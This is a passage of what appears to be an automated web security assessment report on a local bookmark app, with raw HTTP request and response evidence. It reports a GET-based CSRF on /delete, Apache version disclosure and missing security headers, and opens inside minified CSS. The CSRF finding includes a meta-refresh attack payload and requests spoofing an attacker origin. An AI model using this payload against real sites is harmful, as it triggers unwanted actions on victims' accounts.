var(--bs-border-color);border-radius:var(--bs-border-radius);max-width:100%;height:auto}.figure{display:inline-block}.figure-img{margin-bottom:.5rem;line-height:1}.figure-caption{font-size:.875em;color:var(--bs-secondary-color)}.container,.container-fluid,.container-lg,.container-md,.container-sm,.container-xl,.container-xxl{--bs-gutter-x:1.5rem;--bs-gutter-y:0;width:100%;padding-right:calc(var(--bs-gutter-x) * .5);padding-left:calc(var(--bs-gutter-x) * .5);margin-right:auto;margin-left:auto}@media (min-width:576px){.container,.container-sm{max-width:540px}}@media (min-width:768px){.container,.container-md,.container-sm{max-width:720px}}@media (min-width:992px){.container,.container-lg,.container-md,.container-sm{max-width:960px}}@media (min-width:1200px){.container,.container-lg,.container-md,.container-sm,.container-xl{max-width:1140px}}@media (min-width:1400px){.container,.container-lg,.container-md,.container-sm,.container-xl,.container-xxl{max-width:1320px}}.row{--bs-gutter-x:1.5rem;--bs-gutter-y:0;display:flex;flex-wrap:wrap;margin-top:calc(-1 * var(--bs-gutter-y));margin-right:calc(-.5 * var(--bs-gutter-x));margin-left:calc(-.5 * var(--bs-gutter-x))}.row>*{flex-shrink:0;width:100%;max-width:100%;padding-right:calc(var(--bs-gutter-x) * .5);padding-left:calc(var(--bs-gutter-x) * .5);margin-top:var(--bs-gutter-y)}.col{flex:1 0 0%}.row-cols-auto>*{flex:0 0 auto;width:auto}.row-cols-1>*{flex:0 0 auto;width:100%}.row-cols-2>*{flex:0 0 auto;width:50%}.row-cols-3>*{flex:0 0 auto;width:33.3333333333%}.row-cols-4>*{flex:0 0 auto;width:25%}.row-cols-5>*{flex:0 0 auto;width:20%}.row-cols-6>*{flex:0 0 auto;width:16.6666666667%}.col-auto{flex:0 0 auto;width:auto}.col-1{flex:0 0 auto;width:8.33333333%}.col-2{flex:0 0 auto;width:16.66666667%}.col-3{flex:0 0 auto;width:25%}.col-4{flex:0 0 auto;width:33.33333333%}.col-5{flex:0 0 auto;width:41.66666667%}.col-6{flex:0 0 auto;width:50%}.col-7{flex:0 0 auto;width:58.33333333%}.col-8{flex:0 0 auto;width:66.66666667%}.col-9{flex:0 0 auto;width:75%}.col-10{flex:0 0 auto;width:83.33333333%}.col-11{flex:0 0 auto;width:91.66666667%}.col-12{flex:0 0 auto;width:100%}.offset-1{margin-left:8.33333333%}.offset-2{margin-left:16.66666667%}.offset-3{margin-left:25%}.offset-4{margin-left:33.33333333%}.offset-5{margin-left:41.66666667%}.offset-6{margin-left:50%}.offset-7{margin-left:58.33333333%}.offset-8{margin-left:66.66666667%}.offset-9{margin-left:75%}.offset-10{margin-left:83.33333333%}.offset-11{margin-left:91.66666667%}.g-0,.gx-0{--bs-gutter-x:0}.g-0,.gy-0{--bs-gutter-y:0}.g-1,.gx-1{--bs-gutter-x:0.25rem}.g-1,.gy-1{--bs-gutter-y:0.25rem}.g-2,.gx-2{--bs-gutter-x:0.5rem}.g-2,.gy-2{--bs-gutter-y:0.5rem}.g-3,.gx-3{--bs-gutter-x:1rem}.g-3,.gy-3{--bs-gutter-y:1rem}.g-4,.gx-4{--bs-gutter-x:1.5rem}.g-4,.gy-4{--bs-gutter-y:1.5rem}.g-5,.gx-5{--bs-gutter-x:3rem}.g-5,.gy-5{--bs-gutter-y:3rem}@media (min-width:576px){.col-sm{flex:1 0 0%}.row-cols-sm-auto>*{flex:0 0 auto;width:auto}.row-cols-sm-1>*{flex:0 0 auto;width:100%}.row-cols-sm-2>*{flex:0 0 auto;width:50%}.row-cols-sm-3>*{flex:0 0 auto;width:33.3333333333%}.row-cols-sm-4>*{flex:0 0 auto;width:25%}.row-cols-sm-5>*{flex:0 0 auto;width:20%}.row-cols-sm-6>*{flex:0 0 auto;width:16.6666666667%}.col-sm-auto{flex:0 0 auto;width:auto}.col-sm-1{flex:0 0 auto;width:8.33333333%}.col-sm-2{flex:0 0 auto;width:16.66666667%}.col-sm-3{flex:0 0 auto;width:25%}.col-sm-4{flex:0 0 auto;width:33.33333333%}.col-sm-5{flex:0 0 auto;width:41.66666667%}.col-sm-6{flex:0 0 auto;width:50%}.col-sm-7{flex:0 0 auto;width:58.33333333%}.col-sm-8{flex:0 0 auto;width:66.66666667%}.col-sm-9{flex:0 0 auto;width:75%}.col-sm-10{flex:0 0 auto;width:83.33333333%}.col-sm-11{flex:0 0 auto;width:91.66666667%}.col-sm-12{flex:0 0 auto;width:100%}.offset-sm-0{margin-left:0}.offset-sm-1{margin-left:8.33333333%}.offset-sm-2{margin-left:16.66666667%}.offset-sm-3{margin-left:25%}.offset-sm-4{margin-left:33.33333333%}.offset-sm-5{margin-left:41.66666667%}.offset-sm-6{margin-left:50%}.offset-sm-7{margin-left:58.33333333%}.offset-sm-8{margin-left:66.66666667%}.offset-sm-9{margin-left:75%}.offset-sm-10{margin-left:83.33333333%}.offset-sm-11{margin-left:91.66666667%}.g-sm-0,.gx-sm-0{--bs-gutter-x:0}.g-sm-0,.gy-sm-0{--bs-gutter-y:0}.g-sm-1,.gx-sm-1{--bs-gutter-x:0.25rem}.g-sm-1,.gy-sm-1{--bs-gutter-y:0.25rem}.g-sm-2,.gx-sm-2{--bs-gutter-x:0.5rem}.g-sm-2,.gy-sm-2{--bs-gutter-y:0.5rem}.g-sm-3,.gx-sm-3{--bs-gutter-x:1rem}.g-sm-3,.gy-sm-3{--bs-gutter-y:1rem}.g-sm-4,.gx-sm-4{--bs-gutter-x:1.5rem}.g-sm-4,.gy-sm-4{--bs-gutter-y:1.5rem}.g-sm-5,.gx-sm-5{--bs-gutter-x:3rem}.g-sm-5,.gy-sm-5{--bs-gutter-y:3rem}}@media (min-width:768px){.col-md{flex:1 0 0%}.row-cols-md-auto>*{flex:0 0 auto;width:auto}.row-cols-md-1>*{flex:0 0 auto;width:100%}.row-cols-md-2>*{flex:0 0 auto;width:50%}.row-cols-md-3>*{
```

- Evidence `ev-mqz23n5d-2p` — `artifacts/s-0006/ev-mqz23n5d-2p/`

Request:

```http
GET /list HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1471
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 10:09:56 GMT
expires: 0
keep-alive: timeout=5, max=100
powered-by: Flask
pragma: no-cache
server: Apache/2.4.67 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Welcome!</h2>
                <p>Here you can check the status of your bookmarked URLs</p>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="#">Home</a></li>
                            <li class="list-group-item"><a href="/add">Bookmark URL</a></li>
                            <li class="list-group-item"><a href="/about">About us</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container mt-5">
        
        <h3 class="mb-4">No URLs added in your bookmark.</h3>
        
        <ul class="list-group">
            
        </ul>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mqz23qwz-2q` — `artifacts/s-0006/ev-mqz23qwz-2q/`

Request:

```http
GET /list HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1471
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 10:10:01 GMT
expires: 0
keep-alive: timeout=5, max=99
powered-by: Flask
pragma: no-cache
server: Apache/2.4.67 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Welcome!</h2>
                <p>Here you can check the status of your bookmarked URLs</p>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="#">Home</a></li>
                            <li class="list-group-item"><a href="/add">Bookmark URL</a></li>
                            <li class="list-group-item"><a href="/about">About us</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container mt-5">
        
        <h3 class="mb-4">No URLs added in your bookmark.</h3>
        
        <ul class="list-group">
            
        </ul>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

<a id="finding-4"></a>

### 4. [MEDIUM] [csrf] CSRF via GET-based bookmark delete (no CSRF token, SameSite=Lax)

- Screen: `s-0007`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32860/

The /delete endpoint performs a state-changing delete operation via a plain GET request. No CSRF token is required, and the server does not check Origin or Referer headers. The bookmarks cookie is SameSite=Lax, which means it IS automatically sent by the victim's browser on top-level navigation GET requests (e.g., clicking a link or being redirected from an attacker-controlled page). An attacker can trick a victim into visiting a URL like http://target/delete?name=important_bookmark (via a crafted link or redirect) and the victim's bookmarks will be deleted without their knowledge.

**Reproduction**

```
1. Victim must have bookmarks stored (bookmarks cookie set). 2. Attacker creates a page with: <meta http-equiv="refresh" content="0;url=http://target.local:32860/delete?name=TARGET_BOOKMARK"> 3. Victim visits the attacker's page. 4. Browser performs a top-level GET navigation to /delete, automatically sending the SameSite=Lax bookmarks cookie. 5. Server deletes the named bookmark and returns 302. No CSRF token check; Origin/Referer headers ignored.
```

**Evidence**

- Evidence `ev-mqz266td-2s` — `artifacts/s-0007/ev-mqz266td-2s/`

Request:

```http
GET /delete?name=testitem HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 500
cache-control: public, max-age=0
connection: close
content-length: 265
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 10:11:54 GMT
expires: 0
pragma: no-cache
server: Apache/2.4.67 (Debian)

<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

- Evidence `ev-mqz2zp2f-3l` — `artifacts/s-0007/ev-mqz2zp2f-3l/`

Request:

```http
GET /delete?name=anybookmark HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
origin: http://evil.attacker.example.com
referer: http://evil.attacker.example.com/csrf.html
```

Response:

```http
HTTP/1.1 302
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 197
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 10:34:51 GMT
expires: 0
keep-alive: timeout=5, max=100
location: /list
pragma: no-cache
server: Apache/2.4.67 (Debian)

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/list">/list</a>. If not, click the link.
```

- Evidence `ev-mqz3010a-3m` — `artifacts/s-0007/ev-mqz3010a-3m/`

Request:

```http
GET /delete?name=anybookmark HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
origin: http://evil.attacker.example.com
referer: http://evil.attacker.example.com/csrf.html
```

Response:

```http
HTTP/1.1 302
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 197
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 10:35:07 GMT
expires: 0
keep-alive: timeout=5, max=100
location: /list
pragma: no-cache
server: Apache/2.4.67 (Debian)

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/list">/list</a>. If not, click the link.
```

<a id="finding-5"></a>

### 5. [INFO] [info-disclosure] Server version disclosed in Apache error page bodies

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32860/

Apache HTTP Server error pages include the full version string "Apache/2.4.67 (Debian) Server at target.local Port 32860" in their HTML body via the `<address>` tag. The same version is broadcast in the `Server:` response header on every request (confirmed by fingerprint scan). This aids targeted exploitation by narrowing the attacker's CVE search space. The fingerprint scan confirmed the `server: Apache/2.4.67 (Debian)` header is sent on normal 200 responses as well.

**Reproduction**

```
1. Send GET /server-status (or any path that produces an Apache-level 4xx/5xx error).
2. Read the response body — the `<address>` element contains "Apache/2.4.67 (Debian) Server at ...".
3. Any HTTP response also carries the `Server: Apache/2.4.67 (Debian)` header.
Negative control: Flask-handled 404 (GET /nonexistent-path-xyzabc) returns a 207-byte app-layer error page that does NOT include the Apache version string in its body, confirming the disclosure is specific to Apache-rendered error pages.
```

**Evidence**

- Evidence `ev-mqz0w608-1a` — `artifacts/s-0003/ev-mqz0w608-1a/`

Request:

```http
GET /nonexistent-path-xyzabc HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 207
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 09:36:07 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqz0szfl-17` — `artifacts/s-0003/ev-mqz0szfl-17/`

Request:

```http
GET /server-status HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 403
connection: Keep-Alive
content-length: 322
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 09:33:39 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.67 (Debian)

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.67 (Debian) Server at target.local Port 32860</address>
</body></html>
```

- Evidence `ev-mqz0wtdu-1b` — `artifacts/s-0003/ev-mqz0wtdu-1b/`

Request:

```http
GET /server-status HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 403
connection: Keep-Alive
content-length: 322
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 09:36:38 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.67 (Debian)

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.67 (Debian) Server at target.local Port 32860</address>
</body></html>
```

<a id="finding-6"></a>

### 6. [INFO] [headers] Missing security response headers across all endpoints

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32860/

Every HTTP response from the application returns only `Content-Type` as a security-relevant header. Absent headers include: Content-Security-Policy (CSP), X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security (HSTS), and Referrer-Policy. Without CSP and X-Frame-Options the application is susceptible to clickjacking and content injection; without X-Content-Type-Options browsers may MIME-sniff responses; HSTS is absent allowing protocol downgrade. Tested on /about (200 responses, 1345 bytes) — headers absent across both stable replays.

**Reproduction**

```
1. GET http://target.local:32860/about
2. Inspect response headers — only `Content-Type: text/html; charset=utf-8` is present.
3. No Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, or Referrer-Policy headers are returned.
Negative control: GET /server-status returns 403 (322 bytes) — a different response class confirming the baseline; same header absence is observed across all endpoint types.
```

**Evidence**

- Evidence `ev-mqz0szfl-17` — `artifacts/s-0003/ev-mqz0szfl-17/`

Request:

```http
GET /server-status HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 403
connection: Keep-Alive
content-length: 322
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 09:33:39 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.67 (Debian)

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.67 (Debian) Server at target.local Port 32860</address>
</body></html>
```

- Evidence `ev-mqz0usj0-18` — `artifacts/s-0003/ev-mqz0usj0-18/`

Request:

```http
GET /about HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1345
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 09:35:03 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>About us</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Welcome to the best URL bookmarks application ever seen.</h2>
                <p>Here you can check and add new URLs to this online bookmark app</p>
                <p>If you believe this application is useful, please share it</p>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="/list">Home</a></li>
                            <li class="list-group-item"><a href="/add">Bookmark URL</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mqz0ussz-19` — `artifacts/s-0003/ev-mqz0ussz-19/`

Request:

```http
GET /about HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1345
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 09:35:03 GMT
expires: 0
keep-alive: timeout=5, max=99
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>About us</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Welcome to the best URL bookmarks application ever seen.</h2>
                <p>Here you can check and add new URLs to this online bookmark app</p>
                <p>If you believe this application is useful, please share it</p>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="/list">Home</a></li>
                            <li class="list-group-item"><a href="/add">Bookmark URL</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```
